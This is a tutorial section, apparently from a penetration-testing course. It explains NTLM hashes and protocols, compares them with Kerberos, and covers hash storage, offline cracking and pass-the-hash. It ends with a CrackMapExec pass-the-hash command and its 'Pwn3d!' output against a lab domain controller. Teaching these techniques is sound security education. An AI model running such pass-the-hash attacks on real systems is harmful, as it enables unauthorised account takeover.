# NTLM Authentication
Aside from Kerberos and LDAP, Active Directory uses several other authentication methods which can be used (and abused) by applications and services in AD. These include LM, NTLM, NTLMv1, and NTLMv2. LM and NTLM here are the hash names, and NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash. Below is a quick comparison between these hashes and protocols, which shows us that, while not perfect by any means, Kerberos is often the authentication protocol of choice wherever possible. It is essential to understand the difference between the hash types and the protocols that use them.
#### Hash Protocol Comparison

| **Hash/Protocol** | **Cryptographic technique**                          | **Mutual Authentication** | **Message Type**                | **Trusted Third Party**                         |
| ----------------- | ---------------------------------------------------- | ------------------------- | ------------------------------- | ----------------------------------------------- |
| `NTLM`            | Symmetric key cryptography                           | No                        | Random number                   | Domain Controller                               |
| `NTLMv1`          | Symmetric key cryptography                           | No                        | MD4 hash, random number         | Domain Controller                               |
| `NTLMv2`          | Symmetric key cryptography                           | No                        | MD4 hash, random number         | Domain Controller                               |
| `Kerberos`        | Symmetric key cryptography & asymmetric cryptography | Yes                       | Encrypted ticket using DES, MD5 | Domain Controller/Key Distribution Center (KDC) |
## NTHash (NTLM)
`NT LAN Manager` (NTLM) hashes are used on modern Windows systems. It is a challenge-response authentication protocol and uses three messages to authenticate:
- A client first sends a `NEGOTIATE_MESSAGE` to the server.
- Response is a `CHALLENGE_MESSAGE` to verify the client's identity.
- The client responds with an `AUTHENTICATE_MESSAGE`.
 These hashes are stored locally in the SAM database or the **NTDS.DIT** database file on a Domain Controller. The protocol has two hashed password values to choose from to perform authentication: the LM hash (as discussed above) and the NT hash, which is the MD4 hash of the little-endian UTF-16 value of the password. The algorithm can be visualized as: `MD4(UTF-16-LE(password))`.
#### NTLM Authentication Request

- NTLM can be brute-forced by Hashcat, with the longer password (15+), using an offline dictionary attack combined with rules.
- NTLM is vulnerable to the pass-the-hash attack, which means an attacker can use just the NTLM hash (after obtaining via another successful attack) to authenticate to target systems where the user is a local admin without needing to know the cleartext value of the password.

An **NTLM hash** looks like this:
```shell-session
Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::
```
- `Rachel` is the username
- `500` is the Relative Identifier (RID). 500 is the known RID for the `administrator` account
- `aad3c435b514a4eeaad3b935b51304fe` is the LM hash and, if LM hashes are disabled on the system, can not be used for anything
- `e46b9e548fa0d122de7f59fb6d48eaa2` is the NT hash. This hash can either be cracked offline to reveal the cleartext value (depending on the length/strength of the password) or used for a pass-the-hash attack.
Below is an example of a successful pass-the-hash attack using the [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) tool:
```shell-session
[!bash!]$ crackmapexec smb 10.129.41.19 -u rachel -H e46b9e548fa0d122de7f59fb6d48eaa2

SMB         10.129.43.9     445    DC01      [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    DC01      [+] INLANEFREIGHT.LOCAL\rachel:e46b9e548fa0d122de7f59fb6d48eaa2 (Pwn3d!)
```
